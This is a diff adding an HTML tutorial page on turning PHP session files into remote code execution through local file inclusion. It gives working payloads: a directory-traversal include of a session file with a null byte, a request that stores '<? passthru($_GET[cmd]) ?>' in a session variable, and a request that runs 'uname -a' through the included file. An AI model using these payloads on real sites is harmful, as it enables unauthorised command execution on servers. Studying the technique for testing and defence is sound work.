@@ -1,0 +1,48 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>sessions</title>
+</head><body>PHP Sessions<br/>
+<br/>
+Another exploitation is the sessions exploitation. If your site got php sessions (phpsessid, etc..) you’ll can include them and if you can modify the datas, it’ll be easy to execute code. You’ll gotta include sess_[your phpsessid value]. Most of time, it is in /tmp, but you’ll can find it sometimes in /var/lib/php5/ also, etc.. The data stored in phpsessid should be everything (like a name at a register, an option you choose).<br/>
+<br/>
+index.php?p=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7%00<br/>
+<br/>
+In the case of an application which tracks session information, <b>any setting stored as a string which the user controls</b>&nbsp;could provide an excellent target for a local file include vulnerability. The session file will be named ‘sess_&lt;session_id&gt;’. Although the session_id is a random hash it is trivial to retrieve as it is stored locally in a cookie.<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+In our simple example, our session has a few variables but the simplest to control arbitrarily is a field called ‘signature’. PHP applications tend to store all sorts of interesting things in session variables and there is often a string that you control arbitrarily. In this case by setting our ‘signature’ to PHP code we can gain command execution through this session file.<br/>
+<br/>
+<br/>
+-----[ 2.2.4 - Injecting PHP code into session files<br/>
+<br/>
+Suopose this vulnerable code:<br/>
+<br/>
+&nbsp; &nbsp; &lt;?php<br/>
+&nbsp; &nbsp; &nbsp; $user = $_GET['user'];<br/>
+&nbsp; &nbsp; &nbsp; session_register("user");<br/>
+&nbsp; &nbsp; &nbsp; session_start();<br/>
+&nbsp; &nbsp; ?&gt;<br/>
+<br/>
+As we can see, it creates a session variable using a value obtained by GET<br/>
+without any verifications.<br/>
+<br/>
+We can send:<br/>
+&nbsp; &nbsp; http://host/?user=&lt;? passthru($_GET[cmd]) ?&gt;<br/>
+<br/>
+And viewing the cookies of our navigator we can see that:<br/>
+&nbsp; &nbsp; PHPSESSID=b25ca6fea480073cf8eb840b203d343e<br/>
+<br/>
+Analyzing session folder of our system we can see the content:<br/>
+&nbsp; &nbsp; pepelux:~$ more /tmp/sess_b25ca6fea480073cf8eb840b203d343e<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;user|s:26:"&lt;? passthru($_GET[cmd]) ?&gt;";<br/>
+<br/>
+As you see, we can inject code on the file that saved our session and we also<br/>
+can execute commands using this file:<br/>
+&nbsp; &nbsp; http://host/?file=/tmp/sess_b25ca6fea480073cf8eb840b203d343e&amp;cmd=uname -a<br/>
+<br/>
+On this case location file is known and we can select it without problems. If<br/>
+GET is filtered we can send it using POST.<br/>
+</body></html>
